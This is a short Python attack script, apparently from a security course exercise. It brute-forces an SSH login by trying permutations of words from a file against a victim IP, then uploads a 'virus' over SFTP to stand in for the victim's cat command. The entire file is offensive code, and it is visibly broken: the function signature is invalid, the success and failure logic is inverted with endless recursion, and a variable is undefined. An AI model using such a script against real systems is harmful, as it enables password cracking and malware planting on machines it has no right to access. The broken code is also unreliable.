#!/usr/bin/env python3

# cat program -> /usr/bin/cat
# size = 43416 bytes
# ./crack_attack <Victim IP> <Attacker IP> <Attacker port>

import sys
import itertools
import paramiko
import time

usage_txt = "/crack_attack <Victim IP> <Attacker IP> <Attacker port>"
victim_ip = None
attack_ip = None
attack_pt = None
correct_password = None

def try_ssh_connection(hostname, port=22, username, password):
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		client.connect(hostname, port, username, password, timeout=3)
	except paramiko.SSHException as sshException:
		print(f"Unable to establish SSH connection: {sshException}")
		time.sleep(5)
		return try_ssh_connection(hostname, port, username, password)
	else:
		return None


def crack_ssh_password():
	global victim_ip, correct_password

	# file_path = '/home/csc2022/materials/victim.dat'
	file_path = './Test/test.dat'
	
	f = open(file_path)
	tmp = f.readlines()
	lin = [line.rstrip('\n') for line in tmp]
	
	for i in range(1, len(lin) + 1):
		for j in itertools.permutations(lin, i):
			now = ''.join(j)
			client = try_ssh_connection(
				hostname = victim_ip,
				username = 'csc2022',
				password = now
			)
			if client != None:
				correct_password = now
				print(f"Correct Password = {now}")
				return client
	return None


def download_virus(client):
	sftp = client.open_sftp()
	
	sftp.put(localpath, '~/cat')
	sftp.close()

	client.close()
	return


def main():
	global victim_ip, attack_ip, attack_pt

	try:
		victim_ip = sys.argv[1]
		attack_ip = sys.argv[2]
		attack_pt = sys.argv[3]
	except:
		pass
		print(f"Usage:\n{usage_txt}")
		return

	client = crack_ssh_password()
	if client == None:
		print('Crack Password Failed!')
		return

	download_virus(client)

	return 

if __name__ == '__main__':
    main()